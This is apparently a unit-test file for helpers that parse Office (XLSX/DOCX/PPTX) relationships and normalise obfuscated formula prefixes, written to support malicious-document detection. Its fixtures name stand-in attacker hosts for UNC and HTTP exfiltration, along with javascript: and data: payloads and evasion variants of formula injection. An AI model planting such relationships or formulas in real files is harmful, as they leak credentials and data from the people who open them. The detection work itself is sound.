/**
 * S10 — OPC helpers unit tests.
 *
 * Pure unit-level coverage for the shared XLSX/DOCX/PPTX helpers in
 * opc-helpers.js. No env access; no parser involvement.
 */
import { describe, it, expect } from "vitest";
import {
  parseRelationships,
  parseContentTypes,
  normalizeXlfn,
  normalizeFormulaPrefix,
} from "../src/opc-helpers.js";

describe("parseRelationships", () => {
  it("returns [] for empty / non-string input", () => {
    expect(parseRelationships("")).toEqual([]);
    expect(parseRelationships(null)).toEqual([]);
    expect(parseRelationships(undefined)).toEqual([]);
  });

  it("parses a UNC-target External relationship", () => {
    const xml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="\\\\attacker.example\\share\\steal.xlsx" TargetMode="External"/>
</Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(1);
    expect(rels[0].id).toBe("rId1");
    expect(rels[0].target).toBe("\\\\attacker.example\\share\\steal.xlsx");
    expect(rels[0].targetMode).toBe("External");
  });

  it("parses an HTTP-target External relationship", () => {
    const xml = `<Relationships>
  <Relationship Id="rId2" Type="..." Target="http://attacker.example/leak" TargetMode="External"/>
</Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(1);
    expect(rels[0].target).toBe("http://attacker.example/leak");
    expect(rels[0].targetMode).toBe("External");
  });

  it("parses a javascript: target (defensive — must still surface)", () => {
    const xml = `<Relationships>
  <Relationship Id="rId3" Type="..." Target="javascript:alert(1)" TargetMode="External"/>
</Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(1);
    expect(rels[0].target).toBe("javascript:alert(1)");
  });

  it("parses a data: URI target", () => {
    const xml = `<Relationships>
  <Relationship Id="rId4" Type="..." Target="data:text/html;base64,PHNjcmlwdD4=" TargetMode="External"/>
</Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(1);
    expect(rels[0].target.startsWith("data:")).toBe(true);
  });

  it("parses a mixed set in one document", () => {
    const xml = `<Relationships>
  <Relationship Id="rId1" Type="t1" Target="\\\\evil\\x" TargetMode="External"/>
  <Relationship Id="rId2" Type="t2" Target="http://evil/x" TargetMode="External"/>
  <Relationship Id="rId3" Type="t3" Target="javascript:1" TargetMode="External"/>
  <Relationship Id="rId4" Type="t4" Target="data:,x" TargetMode="External"/>
  <Relationship Id="rId5" Type="t5" Target="worksheets/sheet1.xml"/>
</Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(5);
    expect(rels[4].targetMode).toBe(""); // Internal — TargetMode absent
  });

  it("handles single-quoted attribute values", () => {
    const xml = `<Relationships><Relationship Id='rId1' Type='t' Target='http://x' TargetMode='External'/></Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(1);
    expect(rels[0].id).toBe("rId1");
    expect(rels[0].target).toBe("http://x");
  });

  it("is case-insensitive on the tag name", () => {
    const xml = `<Relationships><RELATIONSHIP Id="rId1" Type="t" Target="x"/></Relationships>`;
    const rels = parseRelationships(xml);
    expect(rels.length).toBe(1);
  });
});

describe("parseContentTypes", () => {
  it("returns [] for empty input", () => {
    expect(parseContentTypes("")).toEqual([]);
    expect(parseContentTypes(null)).toEqual([]);
  });

  it("emits Override entries only", () => {
    const xml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>`;
    const overrides = parseContentTypes(xml);
    expect(overrides.length).toBe(2);
    expect(overrides[0].partName).toBe("/xl/workbook.xml");
    expect(overrides[1].partName).toBe("/xl/vbaProject.bin");
    expect(overrides[1].contentType).toBe("application/vnd.ms-office.vbaProject");
  });
});

describe("normalizeXlfn", () => {
  it("returns input unchanged when no prefix", () => {
    expect(normalizeXlfn("=HYPERLINK(\"http://x\")"))
      .toBe('=HYPERLINK("http://x")');
  });

  it("strips _xlfn. single prefix", () => {
    expect(normalizeXlfn("=_xlfn.HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("strips _xlfn._xlws. multi-prefix → HYPERLINK", () => {
    expect(normalizeXlfn("=_xlfn._xlws.HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("strips stacked _xlfn._xlfn. prefixes", () => {
    expect(normalizeXlfn("=_xlfn._xlfn.HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("strips _xlfn._xlws._xlfn. stacked variant", () => {
    expect(normalizeXlfn("=_xlfn._xlws._xlfn.IMPORTXML(\"x\")"))
      .toBe('=IMPORTXML("x")');
  });

  it("is case-insensitive at the head", () => {
    expect(normalizeXlfn("=_XLFN.HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
    expect(normalizeXlfn("=_xlFn._xlWs.HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("does NOT strip inner _xlfn. mid-formula", () => {
    // Legitimate post-2007 functions ship with _xlfn. mid-formula; we must
    // only collapse leading prefixes after the '='.
    expect(normalizeXlfn("=A1+_xlfn.NORM.S(B1)"))
      .toBe("=A1+_xlfn.NORM.S(B1)");
  });

  it("handles formula without leading '='", () => {
    expect(normalizeXlfn("_xlfn.HYPERLINK(\"x\")"))
      .toBe('HYPERLINK("x")');
  });

  it("returns empty / falsy inputs unchanged", () => {
    expect(normalizeXlfn("")).toBe("");
    expect(normalizeXlfn(null)).toBe(null);
    expect(normalizeXlfn(undefined)).toBe(undefined);
  });
});

describe("normalizeFormulaPrefix", () => {
  it("strips leading ASCII space", () => {
    expect(normalizeFormulaPrefix("   =HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("strips leading U+00A0 (no-break space)", () => {
    expect(normalizeFormulaPrefix("  =HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("does NOT strip leading TAB (TAB is itself an FI-02 trigger)", () => {
    expect(normalizeFormulaPrefix("\t=HYPERLINK(\"x\")"))
      .toBe('\t=HYPERLINK("x")');
  });

  it("does NOT strip leading CR (CR is itself an FI-02 trigger)", () => {
    expect(normalizeFormulaPrefix("\r=HYPERLINK(\"x\")"))
      .toBe('\r=HYPERLINK("x")');
  });

  it("maps U+FF1D fullwidth equals to ASCII '='", () => {
    expect(normalizeFormulaPrefix("＝HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("maps U+FE66 small equals to ASCII '='", () => {
    expect(normalizeFormulaPrefix("﹦HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("maps U+2E40 double hyphen to '='", () => {
    expect(normalizeFormulaPrefix("⹀HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("combines: leading spaces + fullwidth equals", () => {
    expect(normalizeFormulaPrefix("   ＝HYPERLINK(\"x\")"))
      .toBe('=HYPERLINK("x")');
  });

  it("returns empty / falsy inputs unchanged", () => {
    expect(normalizeFormulaPrefix("")).toBe("");
    expect(normalizeFormulaPrefix(null)).toBe(null);
    expect(normalizeFormulaPrefix(undefined)).toBe(undefined);
  });

  it("leaves benign text alone", () => {
    expect(normalizeFormulaPrefix("hello world")).toBe("hello world");
  });
});
